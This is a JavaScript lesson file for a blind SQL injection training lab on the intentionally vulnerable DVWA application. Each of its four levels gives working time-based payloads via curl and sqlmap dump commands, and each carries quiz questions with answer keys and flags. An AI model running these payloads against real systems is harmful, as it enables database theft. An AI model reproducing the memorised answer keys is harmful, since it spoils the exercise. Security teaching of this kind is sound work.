const LESSONS = [
  {
    title: "Level 1: Low Security",
    points: 60,
    content: "Welcome to the SQL Injection (Blind) lab! In Blind SQLi, the database does not return data directly to the page. Instead, you must ask true/false questions or use time delays to infer data.\n\n1. Click 'Launch DVWA Instance' above to start your Docker container.\n2. Wait for the new tab to open. You will be on the DVWA Setup page.\n3. Scroll down to the bottom of the page and click the 'Create / Reset Database' button.\n4. After it resets, log in using:\n   Username: admin\n   Password: password\n5. Go to 'DVWA Security' and set the security level to 'Low'.\n\n⚠️ IMPORTANT: Do NOT close the lab container until you complete all 4 challenges!\n\nNavigate to the 'SQL Injection (Blind)' tab.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** Open your Kali terminal. We will use a time-based payload. If it sleeps for 5 seconds, the injection worked. Replace `[TARGET_IP]` and `your_session_id`:\n`curl \"http://[TARGET_IP]/vulnerabilities/sqli_blind/?id=1'+AND+SLEEP(5)+%23&Submit=Submit\" -H \"Cookie: security=low; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** `sqlmap` excels at blind SQLi. We can force it to use Boolean (B) or Time-based (T) techniques:\n`sqlmap -u \"http://[TARGET_IP]/vulnerabilities/sqli_blind/?id=1&Submit=Submit\" --cookie=\"security=low; PHPSESSID=your_session_id\" --technique=BT --dump`",
    questions: [
      { q: "What is the default username for DVWA?", a: "admin" },
      { q: "What is the default password for DVWA?", a: "password" },
      { q: "What SQL function can be used to test for Time-Based Blind SQLi?", a: "SLEEP" },
      { q: "Does Blind SQLi return error messages or data directly to the webpage? (yes/no)", a: "no" },
      { q: "Use your terminal tools to perform a blind SQL injection and extract the hidden flag. What is the flag for the Low security level?", a: "flag{blind_low}" }
    ]
  },
  {
    title: "Level 2: Medium Security",
    points: 60,
    content: "Great job! Let's move to Medium.\n\n1. Go to 'DVWA Security' and change the level to 'Medium'.\n2. Return to the 'SQL Injection (Blind)' tab.\n\nLike regular SQLi, the input is now a dropdown menu, meaning it sends a POST request instead of GET. It also checks for integers.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** We use a POST request with `curl`. Notice there are no quotes around the injected integer payload:\n`curl -X POST \"http://[TARGET_IP]/vulnerabilities/sqli_blind/\" -d \"id=1 AND SLEEP(5)&Submit=Submit\" -H \"Cookie: security=medium; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** Use the `--data` flag for POST injection:\n`sqlmap -u \"http://[TARGET_IP]/vulnerabilities/sqli_blind/\" --data=\"id=1&Submit=Submit\" --cookie=\"security=medium; PHPSESSID=your_session_id\" --technique=BT --dump`",
    questions: [
      { q: "Does the Medium level use a GET or POST request for the vulnerable parameter?", a: "POST" },
      { q: "Do you need to use single quotes to inject into an integer field? (yes/no)", a: "no" },
      { q: "Can you still perform Blind SQL injection on this level? (yes/no)", a: "yes" },
      { q: "What command-line tool is sending the POST request manually?", a: "curl" },
      { q: "Use your terminal tools to perform a blind SQL injection and extract the hidden flag. What is the flag for the Medium security level?", a: "flag{blind_medium}" }
    ]
  },
  {
    title: "Level 3: High Security",
    points: 60,
    content: "Time for High security!\n\n1. Set the DVWA Security level to 'High'.\n2. Go to the 'SQL Injection (Blind)' tab.\n\nIn this level, the target parameter `id` is not sent via the URL or a POST form. Instead, it is passed via a Cookie! \n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** You must inject the payload directly into the `id` cookie:\n`curl \"http://[TARGET_IP]/vulnerabilities/sqli_blind/\" -H \"Cookie: id=1' AND SLEEP(5) %23; security=high; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** By default, `sqlmap` only tests GET and POST parameters. To test cookies, you must increase the `--level` to 2 or higher:\n`sqlmap -u \"http://[TARGET_IP]/vulnerabilities/sqli_blind/\" --cookie=\"id=1; security=high; PHPSESSID=your_session_id\" --level=2 --technique=BT --dump`",
    questions: [
      { q: "In the High level, where is the vulnerable `id` parameter stored?", a: "Cookie" },
      { q: "By default, does `sqlmap` test cookie parameters at level 1? (yes/no)", a: "no" },
      { q: "What `--level` value must be used in `sqlmap` to test cookies?", a: "2" },
      { q: "Is the vulnerability logic on the backend still a form of Blind SQLi? (yes/no)", a: "yes" },
      { q: "Use your terminal tools to perform a blind SQL injection via the cookie and extract the hidden flag. What is the flag for the High security level?", a: "flag{blind_high}" }
    ]
  },
  {
    title: "Level 4: Impossible Security",
    points: 60,
    content: "Finally, the 'Impossible' level.\n\n1. Set the DVWA Security level to 'Impossible'.\n2. Navigate to the SQL Injection (Blind) tab and click 'View Source' at the bottom right.\n\nJust like the previous lab, this level uses PDO Prepared Statements to completely nullify the injection attempt.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** Fetch the source code to verify the prepared statements. The database is safe from Blind SQLi.\n`curl \"http://[TARGET_IP]/vulnerabilities/sqli_blind/source/impossible.php\" -H \"Cookie: security=impossible; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** `sqlmap` will not find any blind injection vectors here because the code is secure. Review the source to find your final flag.",
    questions: [
      { q: "What mechanism completely prevents the Blind SQLi here?", a: "Prepared Statements" },
      { q: "Is time-based SQLi possible against properly implemented PDO prepared statements? (yes/no)", a: "no" },
      { q: "Does a prepared statement separate the SQL structure from the data? (yes/no)", a: "yes" },
      { q: "Is the `sqlmap` tool able to bypass a properly written prepared statement? (yes/no)", a: "no" },
      { q: "Since Blind SQLi is impossible here, review the source code to find the hidden flag. What is the flag for the Impossible security level?", a: "flag{blind_impossible}" }
    ]
  }
];
